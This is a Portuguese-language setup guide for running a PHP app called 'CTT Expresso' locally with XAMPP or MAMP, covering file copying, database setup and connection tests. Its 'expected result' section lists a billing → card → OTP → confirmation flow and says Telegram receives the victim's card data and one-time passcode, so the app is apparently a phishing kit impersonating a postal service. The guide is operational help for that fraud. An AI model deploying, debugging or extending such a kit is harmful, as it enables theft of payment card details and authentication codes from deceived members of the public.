# 🚀 CTT Expresso - Como Usar no Mac (XAMPP/MAMP)

## 📋 **Passo a Passo Simples:**

### **1. 🟢 Inicie o XAMPP ou MAMP**

#### **XAMPP:**
- Abra o XAMPP Control Panel
- Clique em **"Start"** para Apache e MySQL
- Ambos devem ficar verdes

#### **MAMP:**
- Abra o MAMP
- Clique em **"Start Servers"**
- Deve ver luzes verdes

### **2. 📁 Copie os Ficheiros**

```bash
# Copie a pasta xampp_local_working para:

# XAMPP:
sudo cp -r xampp_local_working/* /Applications/XAMPP/htdocs/ctt/

# MAMP:
cp -r xampp_local_working/* /Applications/MAMP/htdocs/ctt/
```

### **3. 🗄️ Configure a Base de Dados (AUTOMÁTICO)**

Visite: `http://localhost/ctt/setup-database.php` (XAMPP)
ou: `http://localhost:8888/ctt/setup-database.php` (MAMP)

**Clique no botão "Setup Database Now"** - vai configurar tudo automaticamente!

### **4. 🧪 Teste a Conexão**

Visite: `http://localhost/ctt/test-connection.php` (XAMPP)
ou: `http://localhost:8888/ctt/test-connection.php` (MAMP)

**Deve ver todos ✅ verdes!**

### **5. 🎯 Use a Aplicação**

Visite: `http://localhost/ctt/` (XAMPP)
ou: `http://localhost:8888/ctt/` (MAMP)

---

## ✅ **O que Esta Versão Faz Automaticamente:**

1. **🔍 Detecta XAMPP ou MAMP automaticamente**
2. **🗄️ Cria a base de dados se não existir**
3. **📊 Testa diferentes configurações até encontrar uma que funcione**
4. **🛠️ Instala todas as tabelas necessárias**
5. **📱 Configura o Telegram automaticamente**

---

## 🐛 **Se Não Funcionar:**

### **Verificar MySQL:**
```bash
# XAMPP: Vá ao Control Panel e veja se MySQL está verde
# MAMP: Vá ao MAMP e veja se os servers estão ligados
```

### **Portas Comuns:**
- **XAMPP**: `localhost:80` (Apache), `localhost:3306` (MySQL)
- **MAMP**: `localhost:8888` (Apache), `localhost:8889` (MySQL)

### **Reiniciar Tudo:**
1. Pare o XAMPP/MAMP
2. Inicie novamente
3. Vá para `setup-database.php` outra vez

---

## 🎉 **Resultado Esperado:**

Após setup completo:
- ✅ Base de dados criada e conectada
- ✅ Todas as páginas funcionam: billing → card → otp → confirmation
- ✅ Telegram recebe 2 mensagens (dados do cartão + OTP)
- ✅ Sem erros de JavaScript ou JSON

**A aplicação deve funcionar perfeitamente no seu Mac!** 🚀

---

## 📞 **URLs Importantes:**

- **Aplicação**: `http://localhost:8888/ctt/`
- **Setup**: `http://localhost:8888/ctt/setup-database.php`
- **Teste**: `http://localhost:8888/ctt/test-connection.php`
- **phpMyAdmin**: `http://localhost:8888/phpMyAdmin`

*(Mude `8888` para `80` se usar XAMPP)*